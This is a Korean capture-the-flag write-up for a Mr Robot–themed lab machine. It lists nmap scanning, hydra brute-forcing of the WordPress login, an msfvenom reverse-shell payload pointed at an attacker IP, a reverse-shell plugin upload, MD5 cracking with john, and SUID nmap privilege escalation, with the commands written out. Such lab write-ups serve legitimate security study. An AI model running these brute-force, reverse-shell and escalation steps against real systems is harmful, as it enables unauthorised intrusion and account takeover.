# solve

- nmap 결과 - 22,80,443 열림
```
─$ sudo nmap -sS -Pn -n --open 10.201.10.44 -p- --min-rate 1000 -T4 -sV -sC -oA tcpdetailed                                                                        

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 31:a6:13:15:9f:5c:47:de:10:4e:a3:90:2a:a0:76:e2 (RSA)
|   256 d8:8b:50:6e:09:a9:98:b5:91:df:8e:1a:71:1e:89:00 (ECDSA)
|_  256 3e:a3:aa:41:08:e4:65:67:06:1d:3d:63:dd:1d:da:52 (ED25519)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).
```

- gobuster -> 워드프레스 사이트 포함 많은 페이지 존재
![[Pasted image 20250925224422.png]]

- robots.txt 내용 -> 여기서 key-1-of-3.txt 경로로 가면 첫 번째 키 획득
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

- robots.txt에서 확인한 fsocity.dic은 말 그대로 딕셔너리처럼 페이지 안에 단어들이 들어있음. 브루트포스에 사용하라는 거로 추측. 

- 워드프레스 4.3.1은 userenumeration에 취약하다.
![[Pasted image 20250925225444.png]]

- curl로 해당 사이트의 단어들 긁어서 fsocity.dic라는 이름으로 파일로 저장
```
curl -s http://10.201.10.44/fsocity.dic -o fsocity.dic
```

- hydra로 userenum해서 Elliot이라는 유저 발견
```
hydra -L fsocity.dic -p 'randompassword' 10.201.10.44 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&wordpress_test_cookie=WP+Cookie+check:F=Invalid username" -t 4 -V
```
![[Pasted image 20250925232212.png]]

- 비밀번호 브루트포스까지해서 ER28-0652라는 비번 획득. 워드프레스 로그인 성공
```
hydra -l Elliot -P fsocity.dic 10.201.50.54 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&wordpress_test_cookie=WP+Cookie+check:F=The password you entered for the username" -t 4 -V
```

- msfvenom으로 리버스쉘 파일 생성
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.4.15.138 LPORT=1234 -f elf -o revshell
```

- zip만 가능, 이때 단순히 압축하거나 확장자 변경해도 X, 따라서 깃헙 워드프레스 전용 리버스쉘을 업로드 후 연결 
![[Pasted image 20250926092225.png]]
```cardlink
url: https://github.com/4m3rr0r/Reverse-Shell-WordPress-Plugin?tab=readme-ov-file
title: "GitHub - 4m3rr0r/Reverse-Shell-WordPress-Plugin: A WordPress plugin that provides reverse shell functionality with a graphical user interface (GUI) for configuration. This plugin allows users to configure and initiate a reverse shell connection to a specified IP address and port."
description: "A WordPress plugin that provides reverse shell functionality with a graphical user interface (GUI) for configuration. This plugin allows users to configure and initiate a reverse shell connection t..."
host: github.com
favicon: https://github.githubassets.com/favicons/favicon.svg
image: https://opengraph.githubassets.com/49583cc806b017ed7363d905d0893d6fefcbc14972edd1dacc0cd2c6ac723e6a/4m3rr0r/Reverse-Shell-WordPress-Plugin
```

- 초기침투 후, home 디렉터리의 robot 유저 폴더에서 두 번째 key를 발견. 하지만 권한이 없다.
![[Pasted image 20250926093439.png]]
![[Pasted image 20250926093933.png]]

- 다른 파일 읽어봄. 현재는 daemon유저인데, 저건 robot의 암호가 md5로 해시화되어 있음. 따서 john으로 크랙 -> abcdefghijklmnopqrstuvwxyz이라는 비밀번호가 나옴. 
```
cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b 
```
```
john --show --format=Raw-MD5 password.raw-md5
```
![[Pasted image 20250926094340.png]]

- robot으로 로그인. 이후 두 번째 키를 읽음
![[Pasted image 20250926094944.png]]

- suid 설정된 파일 검색. nmap이 suid가 설정되어 있다.
![[Pasted image 20250926095228.png]]

- 따라서, gtfobins 명령어 따라서 nmap을 통해 권한상승
![[Pasted image 20250926095901.png]]

- 마지막 key는 root폴더에 존재. 읽기 성공
![[Pasted image 20250926095923.png]]




















